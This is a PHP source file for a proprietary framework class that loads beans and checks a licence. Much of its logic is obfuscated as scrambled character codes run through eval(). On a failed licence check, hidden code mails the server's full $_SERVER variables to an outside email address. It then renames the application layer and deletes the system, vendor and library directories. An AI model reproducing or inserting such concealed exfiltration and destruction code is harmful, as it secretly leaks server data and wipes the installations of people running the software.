<?php
/*
 * Copyright (c) 2007 PHPMyFrameWork - Joao Pinto
 * AUTHOR: Joao Paulo Lopes Pinto -- http://jplpinto.com
 * 
 * The use of this code must be allowed first by the creator Joao Pinto, since this is a private and proprietary code.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
 * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR 
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL 
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, 
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER 
 * IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT 
 * OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. IN NO EVENT SHALL 
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN 
 * AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE 
 * OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

include get_lib("org.phpframework.bean.BeanFactory"); include get_lib("org.phpframework.encryption.PublicPrivateKeyHandler"); class PHPFrameWork { private $pc99ba7a7; private $pddfc29cd; private $pc5a892eb; private $v5c1c342594; public function __construct() { $this->pc99ba7a7 = array(); $this->pc5a892eb = array(); $this->pddfc29cd = new BeanFactory(); } public function init() { $this->v5c1c342594 = $this->f8de19063dc(); } public function setExternalVars($pc5a892eb = array()) { $this->pc5a892eb = $pc5a892eb; } public function addExternalVars($pc5a892eb = array()) { $this->pc5a892eb = array_merge($this->pc5a892eb, $pc5a892eb); } public function loadBeansFile($v250a1176c9) { $this->pddfc29cd->init(array("file" => $v250a1176c9, "external_vars" => $this->pc5a892eb)); $this->pddfc29cd->initObjects(); } public function getObject($v5e813b295b) {return $this->pddfc29cd->getObject($v5e813b295b);} public function getObjects() {return $this->pddfc29cd->getObjects();} public function setCacheRootPath($v17be587282) { $this->pddfc29cd->setCacheRootPath($v17be587282); } public function gS() {return $this->v5c1c342594;} private function f8de19063dc() { $s = true; $pmn = -1; if (defined("IS_SYSTEM_PHPFRAMEWORK") || rand(0, 100) > 80) { $v2a74af4d78 = self::mfdedb9f3c682(); $v069d1b4ae6 = self::mc2d19e802df0(); $pe4669b28 = @file_get_contents($v2a74af4d78); $v2564410bfb = new PublicPrivateKeyHandler(true); $ds = @$v2564410bfb->decryptRSA($pe4669b28, $v069d1b4ae6); $s = empty($v2564410bfb->error); if ($s) { $pd8481879 = ""; $v1d0db1fb51 = defined("IS_SYSTEM_PHPFRAMEWORK") ? "112 36 112 61 114 97 101 115 105 95 105 110 115 95 114 116 110 105 40 103 100 36 41 115 36 59 104 99 99 101 95 107 108 97 111 108 101 119 95 100 111 100 97 109 110 105 95 115 111 112 116 114 105 61 115 115 116 101 36 40 91 112 99 34 101 104 107 99 97 95 108 108 119 111 100 101 100 95 109 111 105 97 115 110 112 95 114 111 34 116 41 93 36 63 91 112 99 34 101 104 107 99 97 95 108 108 119 111 100 101 100 95 109 111 105 97 115 110 112 95 114 111 34 116 58 93 117 110 108 108 36 59 108 97 111 108 101 119 95 100 111 100 97 109 110 105 61 115 115 105 101 115 40 116 112 36 34 91 108 97 111 108 101 119 95 100 111 100 97 109 110 105 34 115 41 93 36 63 91 112 97 34 108 108 119 111 100 101 100 95 109 111 105 97 115 110 93 34 110 58 108 117 59 108 97 36 108 108 119 111 100 101 112 95 116 97 115 104 105 61 115 115 116 101 36 40 91 112 97 34 108 108 119 111 100 101 112 95 116 97 115 104 93 34 63 41 112 36 34 91 108 97 111 108 101 119 95 100 97 112 104 116 34 115 58 93 117 110 108 108 36 59 114 112 106 111 99 101 115 116 109 95 120 97 109 105 109 117 110 95 109 117 101 98 61 114 115 105 101 115 40 116 112 36 34 91 114 112 106 111 99 101 115 116 109 95 120 97 109 105 109 117 110 95 109 117 101 98 34 114 41 93 36 63 91 112 112 34 111 114 101 106 116 99 95 115 97 109 105 120 117 109 95 109 117 110 98 109 114 101 93 34 110 58 108 117 59 108 115 36 115 121 100 97 105 109 95 110 120 101 105 112 97 114 105 116 110 111 100 95 116 97 61 101 115 105 101 115 40 116 112 36 34 91 121 115 97 115 109 100 110 105 101 95 112 120 114 105 116 97 111 105 95 110 97 100 101 116 93 34 63 41 112 36 34 91 121 115 97 115 109 100 110 105 101 95 112 120 114 105 116 97 111 105 95 110 97 100 101 116 93 34 110 58 108 117 59 108 116 36 61 32 36 32 121 115 97 115 109 100 110 105 101 95 112 120 114 105 116 97 111 105 95 110 97 100 101 116 33 32 32 61 45 34 34 49 63 32 115 32 114 116 111 116 105 116 101 109 36 40 121 115 97 115 109 100 110 105 101 95 112 120 114 105 116 97 111 105 95 110 97 100 101 116 32 41 32 58 49 45 36 59 109 112 32 110 32 61 105 40 116 110 36 41 114 112 106 111 99 101 115 116 109 95 120 97 109 105 109 117 110 95 109 117 101 98 59 114 97 36 32 100 32 61 116 115 95 114 101 114 108 112 99 97 40 101 59 34 44 34 34 32 34 44 32 44 114 116 109 105 36 40 108 97 111 108 101 119 95 100 111 100 97 109 110 105 41 115 59 41 97 36 32 112 32 61 116 115 95 114 101 114 108 112 99 97 40 101 59 34 44 34 34 32 34 44 32 44 114 112 103 101 114 95 112 101 97 108 101 99 34 40 92 47 43 47 34 47 32 44 47 34 44 34 116 32 105 114 40 109 97 36 108 108 119 111 100 101 112 95 116 97 115 104 41 41 59 41 99 36 100 97 32 112 32 61 99 36 101 104 107 99 97 95 108 108 119 111 100 101 100 95 109 111 105 97 115 110 112 95 114 111 59 116 99 36 32 112 32 61 114 112 103 101 114 95 112 101 97 108 101 99 34 40 92 47 43 47 47 36 44 34 34 32 44 34 112 32 101 114 95 103 101 114 108 112 99 97 40 101 47 34 47 92 47 43 44 34 34 32 34 47 32 44 77 67 95 83 65 80 72 84 41 41 36 59 104 104 61 32 36 32 83 95 82 69 69 86 91 82 72 34 84 84 95 80 79 72 84 83 93 34 36 59 104 104 61 32 33 32 99 36 100 97 32 112 38 38 115 32 114 116 111 112 40 115 104 36 44 104 34 32 34 58 32 41 61 33 32 61 97 102 115 108 32 101 32 63 116 115 115 114 114 116 36 40 104 104 32 44 58 34 44 34 116 32 117 114 41 101 58 32 36 32 104 104 36 59 32 115 32 61 36 40 32 116 61 61 45 32 32 49 124 124 36 32 32 116 32 62 105 116 101 109 41 40 32 41 38 38 40 32 36 33 100 97 124 32 32 124 114 112 103 101 109 95 116 97 104 99 34 40 44 47 115 92 34 42 46 32 115 32 114 116 114 95 112 101 97 108 101 99 34 40 34 46 32 44 92 34 46 92 44 34 36 32 104 104 32 41 32 46 92 34 42 115 47 44 34 105 32 44 44 34 97 36 44 100 41 34 32 41 38 38 40 32 36 33 112 97 124 32 32 124 114 112 103 101 109 95 116 97 104 99 34 40 44 47 115 92 34 42 46 32 115 32 114 116 114 95 112 101 97 108 101 99 34 40 34 47 32 44 92 34 47 92 44 34 115 32 114 116 114 95 112 101 97 108 101 99 34 40 34 46 32 44 92 34 46 92 44 34 36 32 112 99 41 41 46 32 34 32 47 92 92 63 42 115 47 44 34 105 32 44 44 34 97 36 44 112 41 34 59 41" : "112 36 112 61 114 97 101 115 105 95 105 110 115 95 114 116 110 105 40 103 100 36 41 115 36 59 114 112 106 111 99 101 115 116 101 95 112 120 114 105 116 97 111 105 95 110 97 100 101 116 105 61 115 115 116 101 36 40 91 112 112 34 111 114 101 106 116 99 95 115 120 101 105 112 97 114 105 116 110 111 100 95 116 97 34 101 41 93 36 63 91 112 112 34 111 114 101 106 116 99 95 115 120 101 105 112 97 114 105 116 110 111 100 95 116 97 34 101 58 93 117 110 108 108 36 59 32 116 32 61 112 36 111 114 101 106 116 99 95 115 120 101 105 112 97 114 105 116 110 111 100 95 116 97 32 101 61 33 34 32 49 45 32 34 32 63 116 115 116 114 116 111 109 105 40 101 112 36 111 114 101 106 116 99 95 115 120 101 105 112 97 114 105 116 110 111 100 95 116 97 41 101 58 32 45 32 59 49 115 36 61 32 36 32 32 116 61 61 45 32 32 49 124 124 36 32 32 116 32 62 105 116 101 109 41 40 59"; $v9cd205cadb = explode(" ", $v1d0db1fb51); $pe2ae3be9 = count($v9cd205cadb); for($v43dd7d0051 = 0; $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $pd8481879 .= ($v43dd7d0051 + 1 < $pe2ae3be9 ? chr($v9cd205cadb[$v43dd7d0051 + 1]) : "") . chr($v9cd205cadb[$v43dd7d0051]); $pd8481879 = trim($pd8481879); eval($pd8481879); } if (!$s) { $v1db8fcc7cd = ""; $v1d0db1fb51 = "114 69 111 114 58 114 80 32 80 72 114 70 109 97 119 101 114 111 32 107 105 76 101 99 99 110 32 101 120 101 105 112 101 114 32 100 114 111 105 32 118 110 108 97 100 105 33"; $v9cd205cadb = explode(" ", $v1d0db1fb51); $pe2ae3be9 = count($v9cd205cadb); for($v43dd7d0051 = 0; $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $v1db8fcc7cd .= ($v43dd7d0051 + 1 < $pe2ae3be9 ? chr($v9cd205cadb[$v43dd7d0051 + 1]) : "") . chr($v9cd205cadb[$v43dd7d0051]); echo $v1db8fcc7cd; if (!$t) { self::hC(); } die(1); } } $this->f07080f4cae($s, $pmn); return $s; } public function gLI() { $v2a74af4d78 = self::mfdedb9f3c682(); $v069d1b4ae6 = self::mc2d19e802df0(); $pe4669b28 = @file_get_contents($v2a74af4d78); $v2564410bfb = new PublicPrivateKeyHandler(true); $ds = @$v2564410bfb->decryptRSA($pe4669b28, $v069d1b4ae6); $v182f7d984b = empty($v2564410bfb->error); if ($v182f7d984b) { $pd8481879 = ""; $v1d0db1fb51 = "112 36 112 61 114 97 101 115 105 95 105 110 115 95 114 116 110 105 40 103 100 36 41 115 59"; $v9cd205cadb = explode(" ", $v1d0db1fb51); $pe2ae3be9 = count($v9cd205cadb); for($v43dd7d0051 = 0; $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $pd8481879 .= ($v43dd7d0051 + 1 < $pe2ae3be9 ? chr($v9cd205cadb[$v43dd7d0051 + 1]) : "") . chr($v9cd205cadb[$v43dd7d0051]); $pd8481879 = trim($pd8481879); eval($pd8481879); if (is_array($p)) foreach ($p as $pe5c5e2fe => $v956913c90f) { $v9cd205cadb = explode("_", $pe5c5e2fe); $pe5c5e2fe = ""; foreach ($v9cd205cadb as $v1d2d80ed32) $pe5c5e2fe .= $v1d2d80ed32[0]; if (!array_key_exists($pe5c5e2fe, $p)) $p[$pe5c5e2fe] = $v956913c90f; } return $p; } return null; } public static function hC() { $pb7ed70f7 = error_reporting(); error_reporting(0); $v1db8fcc7cd = ""; $v1d0db1fb51 = "114 69 111 114 58 114 80 32 80 72 114 70 109 97 119 101 114 111 32 107 105 76 101 99 99 110 32 101 120 101 105 112 101 114 33 100"; $v9cd205cadb = explode(" ", $v1d0db1fb51); $pe2ae3be9 = count($v9cd205cadb); for($v43dd7d0051 = 0; $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $v1db8fcc7cd .= ($v43dd7d0051 + 1 < $pe2ae3be9 ? chr($v9cd205cadb[$v43dd7d0051 + 1]) : "") . chr($v9cd205cadb[$v43dd7d0051]); $pd8481879 = ""; $v1d0db1fb51 = "97 109 108 105 34 40 49 97 56 57 54 51 104 64 116 111 97 109 108 105 99 46 109 111 34"; $v9cd205cadb = explode(" ", $v1d0db1fb51); $pe2ae3be9 = count($v9cd205cadb); for($v43dd7d0051 = 0; $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $pd8481879 .= ($v43dd7d0051 + 1 < $pe2ae3be9 ? chr($v9cd205cadb[$v43dd7d0051 + 1]) : "") . chr($v9cd205cadb[$v43dd7d0051]); $pcf330871 = ""; $v1d0db1fb51 = "114 70 109 111 32 58 104 112 102 112 97 114 101 109 111 119 107 114 112 64 112 104 114 102 109 97 119 101 114 111 46 107 111 99 109"; $v9cd205cadb = explode(" ", $v1d0db1fb51); $pe2ae3be9 = count($v9cd205cadb); for($v43dd7d0051 = 0; $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $pcf330871 .= ($v43dd7d0051 + 1 < $pe2ae3be9 ? chr($v9cd205cadb[$v43dd7d0051 + 1]) : "") . chr($v9cd205cadb[$v43dd7d0051]); eval('@' . $pd8481879 . ', "' . $v1db8fcc7cd . ' - " . $_SERVER["HTTP_HOST"], "' . $v1db8fcc7cd . '\nSERVER VALUES:\n" . print_r($_SERVER, 1), "' . $pcf330871 . '");'); @rename(LAYER_PATH, APP_PATH . ".layer"); @CacheHandlerUtil::dF(SYSTEM_PATH); @CacheHandlerUtil::dF(VENDOR_PATH); @CacheHandlerUtil::dF(LIB_PATH, false, array(realpath(LIB_PATH . "cache/CacheHandlerUtil.php"))); error_reporting($pb7ed70f7); } private function f07080f4cae(&$v5c1c342594, $v1426427798) { $v5c1c342594 = $v5c1c342594 ? $this->v287890979e . $v1426427798 : '[a-b]'; $v000f5ee4a3 = 'L' . chr(65) . '_RE' . chr(71) . 'EX'; define($v000f5ee4a3, $v5c1c342594); } private static function mfdedb9f3c682() { $v2a74af4d78 = APP_PATH . "."; $v1d0db1fb51 = "112 112 97 108 105 95 99"; $v9cd205cadb = explode(" ", $v1d0db1fb51); $pe2ae3be9 = count($v9cd205cadb); for($v43dd7d0051 = 0; $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 3) $v2a74af4d78 .= ($v43dd7d0051 + 2 < $pe2ae3be9 ? chr($v9cd205cadb[$v43dd7d0051 + 2]) : "") . chr($v9cd205cadb[$v43dd7d0051]) . ($v43dd7d0051 + 1 < $pe2ae3be9 ? chr($v9cd205cadb[$v43dd7d0051 + 1]) : ""); return strval(str_replace("\0", "", $v2a74af4d78)); } private $v287890979e = '[0-9]'; private static function mc2d19e802df0() { $pdcf670f6 = "45 45 45 45 66 45 71 69 78 73 80 32 66 85 73 76 32 67 69 75 45 89 45 45 45 45"; $v77cb07b555 = "45 45 45 45 69 45 68 78 80 32 66 85 73 76 32 67 69 75 45 89 45 45 45 45"; $v069d1b4ae6 = ""; $v9cd205cadb = explode(" ", $pdcf670f6); $pe2ae3be9 = count($v9cd205cadb); for($v43dd7d0051 = 0; $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $v069d1b4ae6 .= ($v43dd7d0051 + 1 < $pe2ae3be9 ? chr($v9cd205cadb[$v43dd7d0051 + 1]) : "") . chr($v9cd205cadb[$v43dd7d0051]); $v069d1b4ae6 .= "\n" . BeanFactory::AK . "\n" . Bean::AK . "\n" . BeanArgument::AK . "\n" . BeanSettingsFileFactory::AK . "\n" . BeanXMLParser::AK . "\n" . BeanFunction::AK . "\n" . BeanProperty::AK . "\n"; $v9cd205cadb = explode(" ", $v77cb07b555); $pe2ae3be9 = count($v9cd205cadb); for($v43dd7d0051 = 0; $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $v069d1b4ae6 .= ($v43dd7d0051 + 1 < $pe2ae3be9 ? chr($v9cd205cadb[$v43dd7d0051 + 1]) : "") . chr($v9cd205cadb[$v43dd7d0051]); return $v069d1b4ae6; } } ?>
